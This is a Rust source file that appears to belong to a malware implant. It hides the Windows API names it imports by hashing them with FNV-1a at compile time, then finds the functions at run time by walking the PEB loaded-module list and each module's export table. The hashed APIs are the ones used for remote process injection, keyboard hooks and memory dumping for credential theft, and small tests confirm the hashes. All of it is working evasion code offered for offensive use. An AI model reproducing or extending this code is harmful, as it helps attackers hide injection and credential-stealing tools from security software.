/// FNV-1a 32-bit hash — used to identify Windows API names without
/// storing plaintext strings in the IAT.  `const fn` so hashes are
/// computed at compile time and never appear as literals in the binary.
pub const fn fnv1a(name: &[u8]) -> u32 {
    let mut hash: u32 = 0x811c9dc5; // FNV offset basis
    let mut i = 0;
    while i < name.len() {
        hash ^= name[i] as u32;
        hash = hash.wrapping_mul(0x01000193); // FNV prime
        i += 1;
    }
    hash
}

/// Pre-computed hashes for the APIs the implant needs.
/// Avoids any string in the Import Address Table.
pub mod hashes {
    use super::fnv1a;

    pub const LOAD_LIBRARY_A: u32       = fnv1a(b"LoadLibraryA");
    pub const GET_PROC_ADDRESS: u32     = fnv1a(b"GetProcAddress");
    pub const VIRTUAL_ALLOC: u32        = fnv1a(b"VirtualAlloc");
    pub const VIRTUAL_ALLOC_EX: u32     = fnv1a(b"VirtualAllocEx");
    pub const VIRTUAL_PROTECT: u32      = fnv1a(b"VirtualProtect");
    pub const OPEN_PROCESS: u32         = fnv1a(b"OpenProcess");
    pub const WRITE_PROCESS_MEMORY: u32 = fnv1a(b"WriteProcessMemory");
    pub const CREATE_REMOTE_THREAD: u32 = fnv1a(b"CreateRemoteThread");
    pub const SET_WINDOWS_HOOK_EX_A: u32 = fnv1a(b"SetWindowsHookExA");
    pub const MINI_DUMP_WRITE_DUMP: u32 = fnv1a(b"MiniDumpWriteDump");
}

/// Walk the PEB InMemoryOrderModuleList and resolve an API by its FNV-1a hash.
/// Returns the raw function pointer on match, None if not found.
/// Windows-only: requires PEB access via inline asm / TEB.
#[cfg(windows)]
pub unsafe fn resolve_by_hash(target_hash: u32) -> Option<*const ()> {
    use std::arch::asm;

    // Read PEB from GS:[0x60] (x86-64 Windows)
    let peb_ptr: usize;
    asm!("mov {}, gs:[0x60]", out(reg) peb_ptr);

    // PEB.Ldr offset = 0x18, LDR_DATA.InMemoryOrderModuleList = 0x20
    let ldr       = *(peb_ptr as *const usize).add(3);    // PEB+0x18
    let list_head = (ldr + 0x20) as *const usize;         // InMemoryOrderModuleList.Flink

    let mut entry = *list_head;
    while entry != list_head as usize {
        // LDR_DATA_TABLE_ENTRY.DllBase at InMemoryOrder+0x20
        let dll_base = *((entry + 0x20) as *const usize);
        if dll_base == 0 {
            entry = *(entry as *const usize);
            continue;
        }

        // Parse PE Export Directory
        let dos   = dll_base as *const u8;
        let pe_off = *(dos.add(0x3c) as *const u32) as usize;
        let exp_off = *(dos.add(pe_off + 0x78) as *const u32) as usize;
        if exp_off == 0 {
            entry = *(entry as *const usize);
            continue;
        }

        let exp_dir   = dos.add(exp_off);
        let n_names   = *(exp_dir.add(0x18) as *const u32) as usize;
        let names_rva = *(exp_dir.add(0x20) as *const u32) as usize;
        let ords_rva  = *(exp_dir.add(0x24) as *const u32) as usize;
        let funcs_rva = *(exp_dir.add(0x1c) as *const u32) as usize;

        for i in 0..n_names {
            let name_rva = *(dos.add(names_rva + i * 4) as *const u32) as usize;
            let name_ptr = dos.add(name_rva);

            // Build byte slice from null-terminated export name
            let mut len = 0usize;
            while *name_ptr.add(len) != 0 {
                len += 1;
            }
            let name_bytes = std::slice::from_raw_parts(name_ptr, len);

            if fnv1a(name_bytes) == target_hash {
                let ord     = *(dos.add(ords_rva + i * 2) as *const u16) as usize;
                let fn_rva  = *(dos.add(funcs_rva + ord * 4) as *const u32) as usize;
                return Some(dos.add(fn_rva) as *const ());
            }
        }

        entry = *(entry as *const usize);
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hashes_are_stable() {
        assert_eq!(hashes::LOAD_LIBRARY_A, fnv1a(b"LoadLibraryA"));
        assert_eq!(hashes::VIRTUAL_ALLOC, fnv1a(b"VirtualAlloc"));
        assert_eq!(hashes::OPEN_PROCESS, fnv1a(b"OpenProcess"));
    }

    #[test]
    fn different_apis_have_different_hashes() {
        assert_ne!(hashes::LOAD_LIBRARY_A, hashes::VIRTUAL_ALLOC);
        assert_ne!(hashes::OPEN_PROCESS, hashes::CREATE_REMOTE_THREAD);
    }
}
